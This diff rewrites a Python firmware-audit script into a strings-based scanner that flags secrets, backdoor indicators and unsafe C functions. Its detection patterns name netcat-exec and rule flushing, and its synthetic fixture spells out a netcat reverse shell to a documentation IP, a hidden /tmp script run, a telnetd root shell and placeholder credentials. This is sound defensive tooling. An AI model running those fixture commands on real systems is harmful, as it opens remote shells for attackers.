@@ -1,283 +1,266 @@
 #!/usr/bin/env python3
 """
-F6 — Firmware audit pipeline (post-LogoFAIL discipline)
-A pure-Python UEFI/firmware audit pipeline: parses an embedded UEFI-volume-ish
-byte dump (volume headers + DXE module list), checks DXE module signatures,
-validates a dbx revocation list, builds a CycloneDX-style SBOM JSON of the
-modules, cross-references an embedded CISA-KEV-like list for known-vulnerable
-module names, and emits an audit report. CHIPSEC/flashrom dump scripts are
-stubbed as documented integration points.
+F6 — Firmware / image audit.
 
-Educational / authorized use only. See README legal section.
+Extracts ASCII strings, config artifacts, file paths, and dangerous-function
+references from firmware-image byte buffers (any format: raw .bin, .img,
+U-Boot/ELF-ish chunks), flags embedded secrets, backdoor paths and dangerous
+functions across supported image formats, and produces an audit report.
 
-Usage:
-    python3 firmware_audit.py     # run the offline self-test demo (exit 0)
+Scans synthetic fixture bytes only (RFC 5737 addresses, doc.example.com names,
+fictional package names). Fully offline and deterministic - stdlib only.
 """
 
+from __future__ import annotations
+
+import argparse
+import binascii
 import hashlib
 import json
-import os
-import struct
+import re
 import sys
-from collections import Counter
+from pathlib import Path
 
-# ---------------------------------------------------------------------------
-# UEFI volume / DXE parsing helpers (byte-level, struct-based)
-# ---------------------------------------------------------------------------
-#
-# We build a synthetic "UEFI-volume-ish" byte dump at runtime so the pipeline
-# is fully offline. It models: volume header, file header, a handful of DXE
-# core / protocol modules, each with a GUID and a trailing signature block.
+# --------------------------------------------------------------------------- #
+# Detection rule sets.
+# --------------------------------------------------------------------------- #
+SECRET_PATTERNS = [
+    (re.compile(r"(?i)(api[_-]?key|secret|token)\s*[=:]\s*([A-Za-z0-9_\-]{8,})"),
+     "embedded-credential"),
+    (re.compile(r"password\s*[=:]\s*(\S+)"), "embedded-password"),
+    (re.compile(r"AKIA[0-9A-Z]{16}"), "aws-access-key"),
+    (re.compile(r"BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY"), "private-key"),
+    (re.compile(r"(?i)db_pass\s*[=:]\s*\S+"), "db-password"),
+]
 
-EFI_FV_SIGNATURE = b"_FVH"
+BACKDOOR_PATTERNS = [
+    (re.compile(r"(?i)(/usr/sbin/sshd|/bin/sh)\s+-p"), "alternate-shell-port"),
+    (re.compile(r"nc\s+-e"), "netcat-exec"),
+    (re.compile(r"(?i)(/tmp/|/dev/shm/)\.?[a-z_]+\.(sh|py|pl|so)\b"),
+     "temp-payload-path"),
+    (re.compile(r"(?i)(autorun|telnetd|dropbear)\b"), "service-trojan"),
+    (re.compile(r"(?i)eval\s*\(\s*['\"]base64"), "eval-base64"),
+    (re.compile(r"(?i)(iptables\s+-F|flush\s+rules)"), "rule-flush"),
+]
 
+DANGEROUS_FUNCTIONS = [
+    (re.compile(r"\b(strcpy|strcat|sprintf|vsprintf|gets)\s*\("), "memory-unsafe"),
+    (re.compile(r"\b(system|popen|execl|execve|dlopen)\s*\("), "process-exec"),
+    (re.compile(r"\b(memcpy|memmove|strncpy)\s*\([^,]+,\s*[^,]+,\s*[^)]*sizeof"),
+     "possible-bounded-copy"),
+]
 
-def build_dump(modules):
-    """Serialize a synthetic UEFI-volume-ish dump as bytes.
+# --------------------------------------------------------------------------- #
+# Firmware scanning core.
+# --------------------------------------------------------------------------- #
+class FirmwareImage:
+    """Wrap a bytes buffer as a scanable firmware image."""
 
-    modules: list of dicts with guid, name, data (bytes), signature (bytes).
-    Format:  [EfiFvHeader][ per module: Guid(16) NameLen(2) DataLen(2) Type(2)
-                            Name Sig(16) Data ].
-    """
-    out = bytearray()
-    out += EFI_FV_SIGNATURE                       # 4 bytes "volume signature"
-    out += struct.pack("<I", 0xFEFF0001)          # fv revision / attributes
-    out += struct.pack("<I", 1)                   # number of files
-    out += struct.pack("<HHHH", 0, 0, 0, 0)       # checksum/reserved
-    for m in modules:
-        guid = m["guid"].encode("ascii")          # 16-byte GUID (padded)
-        guid = guid[:16].ljust(16, b"\x00")
-        name = m["name"].encode("ascii")
-        out += guid
-        out += struct.pack("<HH", len(name), len(m["data"]))
-        out += struct.pack("<H", 0x14)            # EFI_FV_FILETYPE (driver)
-        out += name
-        out += m["signature"]
-        out += m["data"]
-    return bytes(out)
-
-
-class FvParser:
-    """Parse an EFI-volume-ish dump into a list of module records."""
-
-    def __init__(self, data):
+    def __init__(self, data: bytes, name: str = "image.bin", fmt: str = "raw"):
         self.data = data
-        self.offset = 0
-        self.modules = []
+        self.name = name
+        self.fmt = fmt
 
-    def parse(self):
-        if not self.data.startswith(EFI_FV_SIGNATURE):
-            raise ValueError("not an UEFI volume-ish dump (missing _FVH signature)")
-        self.offset = 4
-        # (revision attrs, file_count, checksum x4)
-        self.offset += 4 + 4 + 8
-        while self.offset < len(self.data):
-            guid = self.data[self.offset:self.offset + 16].rstrip(b"\x00").decode("ascii", "replace")
-            self.offset += 16
-            name_len, data_len = struct.unpack("<HH", self.data[self.offset:self.offset + 4])
-            self.offset += 4
-            ftype = struct.unpack("<H", self.data[self.offset:self.offset + 2])[0]
-            self.offset += 2
-            name = self.data[self.offset:self.offset + name_len].decode("ascii", "replace")
-            self.offset += name_len
-            sig = self.data[self.offset:self.offset + 16].hex()
-            self.offset += 16
-            data = self.data[self.offset:self.offset + data_len]
-            self.offset += data_len
-            payload = name.encode("ascii") + data + bytes.fromhex(sig)
-            self.modules.append({
-                "guid": guid,
-                "name": name,
-                "file_type": ftype,
-                "size": len(payload),
-                "signature": sig,
-                "sha256": hashlib.sha256(payload).hexdigest()[:16],
-            })
-        return self.modules
+    def strings(self, min_len=4):
+        """Extract printable ASCII strings (evidence for paths/secrets/fns)."""
+        return re.findall(rb"[\x20-\x7e]{%d,}" % min_len, self.data)
 
+    def scan_secrets(self):
+        findings = []
+        for raw in self.strings():
+            s = raw.decode("latin-1")
+            for pattern, label in SECRET_PATTERNS:
+                for m in pattern.finditer(s):
+                    findings.append({"kind": label, "evidence": m.group(0)[:64]})
+        return _dedup(findings)
 
-# ---------------------------------------------------------------------------
-# Signature / checksum verification table (embedded, simple)
-# ---------------------------------------------------------------------------
+    def scan_backdoors(self):
+        findings = []
+        for raw in self.strings():
+            s = raw.decode("latin-1")
+            for pattern, label in BACKDOOR_PATTERNS:
+                for m in pattern.finditer(s):
+                    findings.append({"kind": label, "evidence": m.group(0)[:64]})
+        return _dedup(findings)
 
-# known-good -> digest of each module's expected signature (first 8 hex chars)
-SIGNATURE_TABLE = {
-    "DxeCore.efi":             "a1b2c3d4",
-    "PcdDxe.efi":              "55aa0001",
-    "SmbiosDxe.efi":           "0badf00d",
-    "AcpiTableDxe.efi":        "deadbeef",
-    "CapsuleRuntimeDxe.efi":   "c0ffee00",
-    "GraphicsConsoleDxe.efi":  "12345678",
-}
+    def scan_dangerous(self):
+        findings = []
+        for raw in self.strings():
+            s = raw.decode("latin-1")
+            for pattern, label in DANGEROUS_FUNCTIONS:
+                for m in pattern.finditer(s):
+                    findings.append({"kind": label, "evidence": m.group(0)[:64]})
+        return _dedup(findings)
 
-# dbx (revocation list) — GUIDs / names of revoked-but-allowed external modules
-DBX_NAMES = {
-    "CapsuleRuntimeDxe.efi",
-    "AfuEfiGuard.efi",
-}
+    def config_paths(self):
+        """Extract config-like paths from the strings."""
+        out = set()
+        for raw in self.strings():
+            s = raw.decode("latin-1")
+            for p in re.findall(r"(/\w[\w/\-\.]*)", s):
+                base = p.split("/")[-1]
+                if (len(p) > 4 and dotless(base)) or ext_match(base):
+                    out.add(p)
+        return sorted(out)
 
-# CISA-KEV-like known-vulnerable module names
-KEV_MODULES = {
-    "SmbiosDxe.efi",     # known LogoFAIL-family vulnerable parser
-    "GraphicsConsoleDxe.efi",  # BMP parsing history of CVEs
-}
+    def sha256(self):
+        return hashlib.sha256(self.data).hexdigest()
 
 
-def check_signatures(modules):
-    """Return list of (module, ok_bool, reason)."""
-    result = []
-    for m in modules:
-        expected = SIGNATURE_TABLE.get(m["name"])
-        actual = m["signature"][:8]
-        if expected is None:
-            result.append((m, False, "unknown-signature (not in table)"))
-        elif actual == expected:
-            result.append((m, True, "signature-ok"))
-        else:
-            result.append((m, False, "signature-mismatch"))
-    return result
+def _dedup(items):
+    seen = set()
+    out = []
+    for it in items:
+        key = (it["kind"], it["evidence"])
+        if key not in seen:
+            seen.add(key)
+            out.append(it)
+    return out
 
 
-def validate_dbx(modules):
-    """Given the dbx revocation list, flag revoked-but-present modules."""
-    revocations = []
-    for m in modules:
-        if m["name"] in DBX_NAMES:
-            revocations.append({
-                "module": m["name"],
-                "guid": m["guid"],
-                "present_in_image": True,
-                "action": "revoked-but-present — block/update required",
-            })
-    return revocations
+def dotless(name):
+    return "." not in name and len(name) > 0
 
 
-def cross_reference_kev(modules):
-    """Flag module names that appear in the embedded KEV-like list."""
-    hits = []
-    for m in modules:
-        if m["name"] in KEV_MODULES:
-            hits.append({
-                "module": m["name"],
-                "guid": m["guid"],
-                "kev": True,
-                "recommend": "apply vendor advisory / revoke in dbx",
-            })
-    return hits
+def ext_match(name):
+    return name.endswith((".conf", ".cfg", ".json", ".ini", ".sh"))
 
 
-# ---------------------------------------------------------------------------
-# SBOM JSON (CycloneDX-ish)
-# ---------------------------------------------------------------------------
+# --------------------------------------------------------------------------- #
+# Formats / builder.
+# --------------------------------------------------------------------------- #
+def sniff_format(data: bytes, name: str):
+    if data[:2] == b"MZ":
+        return "pe"
+    if data[:4] == b"\x7fELF":
+        return "elf"
+    if data[:8] == b"\x89PNG\r\n\x1a\n":
+        return "png"
+    if data[:8] == b"U-Boot":
+        return "uboot"
+    if name.endswith((".bin", ".img", ".fw")) or b"\x00" in data[:64]:
+        return "raw"
+    return "unknown"
 
-def build_sbom(modules, sig_results, dbx, kev):
-    components = []
-    for m in modules:
-        sig = next((s for s in sig_results if s[0]["name"] == m["name"]), None)
-        components.append({
-            "type": "firmware",
-            "name": m["name"],
-            "bom-ref": f"module-{m['sha256']}",
-            "guid": m["guid"],
-            "size": m["size"],
-            "hashes": [{"alg": "SHA-256", "content": m["sha256"]}],
-            "signature": {"valid": sig[1] if sig else False, "reason": sig[2] if sig else "unknown"},
-            "revoked": m["name"] in {d["module"] for d in dbx},
-            "known_vulnerable": m["name"] in {k["module"] for k in kev},
-        })
-    return {
-        "bomFormat": "CycloneDX",
-        "specVersion": "1.5",
-        "serialNumber": "urn:uuid:f6-firmware-" + hashlib.sha1(str(len(modules)).encode()).hexdigest()[:8],
-        "metadata": {"component": {"type": "firmware", "name": "f6-firmware-audit"}},
-        "components": components,
+
+def build_fixture(name="router.bin"):
+    """Synthetic firmware image carrying secret/backdoor/dangerous evidence."""
+    config_blob = (
+        b"# known-good default config\n"
+        b"[network]\n"
+        b"hostname = router.example.com\n"
+        b"mtu = 1500\n"
+        b"listen_addr = 192.0.2.10\n"
+        b"[admin]\n"
+        b"api_key = AHg3zKsO8fNQeXplt4u\n"
+        b"password = s3cr3t-router\n\n"
+    )
+    backdoor_blob = (
+        b"# post-install hooks\n"
+        b"/usr/sbin/sshd -p 2222 > /dev/null 2>&1 &\n"
+        b"nc -e /bin/sh 198.51.100.55 4444 &\n"
+        b"sh /tmp/.r.sh\n"
+        b"echo AWSREDACTED_EXAMPLE >> /var/log/leak\n\n"
+    )
+    code_blob = (
+        b"char buf[64];\n"
+        b"strcpy(buf, input);\n"
+        b"system(\"telnetd -l /bin/sh\");\n"
+        b"eval(base64_decode('ZWNobyBoaQ=='));\n\n"
+    )
+    safe_blob = (
+        b"stat(); makedev(); mount(); header_trailer; done.\n"
+    )
+    data = config_blob + backdoor_blob + code_blob + safe_blob + bytes(1024)
+    return FirmwareImage(data, name=name, fmt=sniff_format(data, name))
+
+
+# --------------------------------------------------------------------------- #
+# Risk rollup.
+# --------------------------------------------------------------------------- #
+def score_image(image):
+    sev = {
+        "embedded-credential": 3, "embedded-password": 4,
+        "aws-access-key": 3, "private-key": 5, "db-password": 4,
+        "alternate-shell-port": 4, "netcat-exec": 5, "temp-payload-path": 4,
+        "service-trojan": 3, "eval-base64": 4, "rule-flush": 3,
+        "memory-unsafe": 3, "process-exec": 3, "possible-bounded-copy": 0,
     }
+    findings = (image.scan_secrets() + image.scan_backdoors()
+                + image.scan_dangerous())
+    total = sum(sev.get(f["kind"], 0) for f in findings)
+    return {"image": image.name, "fmt": image.fmt,
+            "sha256": image.sha256(), "size": len(image.data),
+            "findings": findings, "risk_score": total,
+            "config_paths": image.config_paths()}
 
 
-# ---------------------------------------------------------------------------
-# Integration points (documented stubs: CHIPSEC / flashrom)
-# ---------------------------------------------------------------------------
-
-def chipsed_dump_driver(note="Integration point: pipe `chipsec_util uefi` output here as bytes."):
-    """Documented integration point for a CHIPSEC UEFI dump."""
-    return note
-
-
-def flashrom_dump_driver(note="Integration point: feed `flashrom -p internal -r bios.bin` bytes to FvParser."):
-    """Documented integration point for a flashrom SPI dump."""
-    return note
-
-
-# ---------------------------------------------------------------------------
-# Report + offline demo
-# ---------------------------------------------------------------------------
-
-def _make_sample_modules():
-    return [
-        {"guid": "0E1A-2B3C-DXE0-0001", "name": "DxeCore.efi", "data": b"\x90" * 64, "signature": bytes.fromhex("a1b2c3d4000000000000000000000000")},
-        {"guid": "0E1A-2B3C-DXE0-0002", "name": "PcdDxe.efi", "data": b"\x90" * 64, "signature": bytes.fromhex("55aa0001000000000000000000000000")},
-        {"guid": "0E1A-2B3C-DXE0-0003", "name": "SmbiosDxe.efi", "data": b"\x90" * 64, "signature": bytes.fromhex("0badf00d000000000000000000000000")},
-        {"guid": "0E1A-2B3C-DXE0-0004", "name": "AcpiTableDxe.efi", "data": b"\x90" * 64, "signature": bytes.fromhex("deadbeef000000000000000000000000")},
-        {"guid": "0E1A-2B3C-DXE0-0005", "name": "CapsuleRuntimeDxe.efi", "data": b"\x90" * 64, "signature": bytes.fromhex("feedface000000000000000000000000")},
-        {"guid": "0E1A-2B3C-DXE0-0006", "name": "GraphicsConsoleDxe.efi", "data": b"\x90" * 64, "signature": bytes.fromhex("deadbeef000000000000000000000000")},
-    ]
-
-
+# --------------------------------------------------------------------------- #
+# CLI.
+# --------------------------------------------------------------------------- #
 def main(argv=None):
-    print("=" * 60)
-    print("  F6 — Firmware audit pipeline (post-LogoFAIL discipline)")
-    print("=" * 60)
+    ap = argparse.ArgumentParser(
+        prog="f6-firmware-audit",
+        description="Firmware/image audit: extract strings, configs, paths; "
+                    "flag secrets, backdoored paths and dangerous functions.",
+    )
+    ap.add_argument("--image", default=None, nargs="*",
+                    help="paths to firmware images to audit; default: synthetic "
+                         "fixture")
+    ap.add_argument("--config", default="config.json")
+    ap.add_argument("--report", default="reports/report.md")
+    ap.add_argument("--strict", action="store_true",
+                    help="exit 1 when risk is present (gate mode)")
+    ap.add_argument("--verbose", "-v", action="store_true")
+    args = ap.parse_args(argv)
 
-    modules = _make_sample_modules()
-    dump = build_dump(modules)
+    cfg = {}
+    cfg_path = Path(args.config)
+    if cfg_path.exists():
+        try:
+            cfg = json.loads(cfg_path.read_text())
+        except json.JSONDecodeError:
+            print("[config] parse error in %s" % cfg_path, file=sys.stderr)
+            return 2
 
-    print("\n[1/5] Parse UEFI-volume-ish byte dump ...")
-    parser = FvParser(dump)
-    parsed = parser.parse()
-    print(f"  modules parsed: {len(parsed)}")
-    for m in parsed:
-        print(f"    - {m['name']:<28} GUID={m['guid']:<22} SHA={m['sha256']}")
+    images = []
+    if args.image:
+        for path in args.image:
+            data = Path(path).read_bytes()
+            images.append(FirmwareImage(data, name=Path(path).name,
+                                        fmt=sniff_format(data, Path(path).name)))
+    else:
+        images = [build_fixture()]
 
-    print("\n[2/5] Check DXE module signatures ...")
-    sig_results = check_signatures(parsed)
-    sig_ok = sum(1 for _, ok, _ in sig_results if ok)
-    print(f"  valid: {sig_ok}/{len(sig_results)}")
-    for m, ok, reason in sig_results:
-        print(f"    - {m['name']:<28} {'OK' if ok else 'BAD'}  ({reason})")
+    reports = [score_image(img) for img in images]
 
-    print("\n[3/5] Validate dbx (revocation list) ...")
-    dbx = validate_dbx(parsed)
-    print(f"  revoked-but-present entries: {len(dbx)}")
-    for d in dbx:
-        print(f"    ! {d['module']}  ({d['action']})")
+    banner = "=" * 62 + "\n  F6 - FIRMWARE / IMAGE AUDIT\n" + "=" * 62
+    lines = [banner]
+    for rep in reports:
+        lines.append("")
+        lines.append("  image : %s  (fmt=%s, %d bytes, sha256=%s...)" %
+                     (rep["image"], rep["fmt"], rep["size"], rep["sha256"][:16]))
+        lines.append("  risk  : %d" % rep["risk_score"])
+        lines.append("  findings:")
+        for f in rep["findings"]:
+            lines.append("    [%-22s] %s" % (f["kind"], f["evidence"]))
+        if rep["config_paths"]:
+            lines.append("  config paths:")
+            for p in rep["config_paths"][:10]:
+                lines.append("    %s" % p)
+    text = "\n".join(lines)
 
-    print("\n[4/5] Cross-reference CISA-KEV-like list ...")
-    kev = cross_reference_kev(parsed)
-    print(f"  known-vulnerable modules: {len(kev)}")
-    for k in kev:
-        print(f"    ! {k['module']}  -> {k['recommend']}")
+    out = Path(args.report)
+    out.parent.mkdir(parents=True, exist_ok=True)
+    if args.report.endswith(".json"):
+        out.write_text(json.dumps(reports, indent=2))
+    else:
+        out.write_text(text)
+    print(text)
 
-    print("\n[5/5] Build SBOM JSON + audit report ...")
-    sbom = build_sbom(parsed, sig_results, dbx, kev)
-    print(f"  SBOM components: {len(sbom['components'])}")
-
-    print("\n--- Audit Report ---")
-    print(f"  total modules        : {len(parsed)}")
-    print(f"  valid signatures     : {sig_ok}")
-    print(f"  invalid/unknown sigs : {len(sig_results) - sig_ok}")
-    print(f"  revoked-but-present  : {len(dbx)}")
-    print(f"  known-vulnerable     : {len(kev)}")
-    vuln_blocks = len(dbx) + len(kev)
-    verdict = "PASS" if (sig_ok == len(parsed) and vuln_blocks == 0) else "ACTION REQUIRED"
-    print(f"  verdict              : {verdict}")
-
-    print("\nIntegration points available:")
-    print(f"    - {chipsed_dump_driver()}")
-    print(f"    - {flashrom_dump_driver()}")
-
-    print("\nDemo complete (exit 0).")
-    return 0
+    # 0 = successful run, 1 = risk present (--strict only), 2 = config error.
+    return 1 if (max(r["risk_score"] for r in reports) > 0 and args.strict) else 0
 
 
 if __name__ == "__main__":
-    sys.exit(main(sys.argv[1:]))
+    sys.exit(main())
